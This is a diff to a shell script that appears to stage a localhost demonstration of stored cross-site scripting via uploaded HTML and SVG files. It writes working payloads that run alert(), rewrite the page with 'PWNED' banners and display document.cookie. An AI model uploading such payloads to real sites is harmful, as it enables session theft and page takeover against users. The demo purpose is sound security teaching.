@@ -62,17 +62,20 @@ trap "kill $SERVER_PID 2>/dev/null || true; rm -rf $PAYLOAD_DIR" EXIT
 echo "BENIGN-IMAGE-CONTENT" > "$PAYLOAD_DIR/profile.jpg"
 
 # Malicious HTML — when served back as text/html, the browser executes
-# the script tag.
+# the script tag. The script fires alert() (the canonical XSS proof),
+# updates the title, and rewrites the page body so the audience sees
+# the takeover even after dismissing the alert.
 cat > "$PAYLOAD_DIR/evil.html" <<'EOF'
 <!DOCTYPE html>
 <html><head><title>Photo Album</title></head>
 <body>
 <h1>Innocent looking page</h1>
 <script>
-  // This runs in the victim site's origin — full DOM access, full
+  // Runs in the victim site's origin — full DOM access, full
   // cookie access (assuming no HttpOnly), full localStorage access.
-  document.body.style.background = 'red';
+  alert('PWNED via HTML upload — JS executing in ' + location.origin);
   document.title = 'PWNED — uploaded HTML executes in victim origin';
+  document.body.style.background = 'red';
   document.body.innerHTML += '<h2 style="color:white">PWNED</h2><p style="color:white">cookies seen by attacker JS: ' + (document.cookie || '(none on this localhost page)') + '</p>';
 </script>
 </body></html>
@@ -80,15 +83,24 @@ EOF
 
 # Malicious SVG — also XSS. SVG is XML; <script> inside SVG executes
 # when the SVG is rendered as a top-level navigation (not when used
-# as an <img src=>).
+# as an <img src=>). The static <rect> + <text> draw the visible
+# "PWNED via SVG" red banner regardless of script execution; the
+# alert() and the post-script <text> mutation are what prove the
+# script actually ran.
+#
+# Note: SVG documents have no <body>; mutations go through
+# document.documentElement.
 cat > "$PAYLOAD_DIR/evil.svg" <<'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
+<svg xmlns="http://www.w3.org/2000/svg" width="600" height="200">
   <rect width="100%" height="100%" fill="red"/>
-  <text x="50" y="100" fill="white" font-size="24">PWNED via SVG</text>
-  <script type="application/javascript">
+  <text id="banner" x="20" y="110" fill="white" font-size="28" font-family="sans-serif">PWNED via SVG</text>
+  <script type="application/javascript"><![CDATA[
+    alert('PWNED via SVG-XSS — JS executing in ' + location.origin);
     document.title = 'PWNED via SVG';
-  </script>
+    var t = document.getElementById('banner');
+    if (t) t.textContent = 'SCRIPT RAN — DOM access from uploaded SVG';
+  ]]></script>
 </svg>
 EOF
 
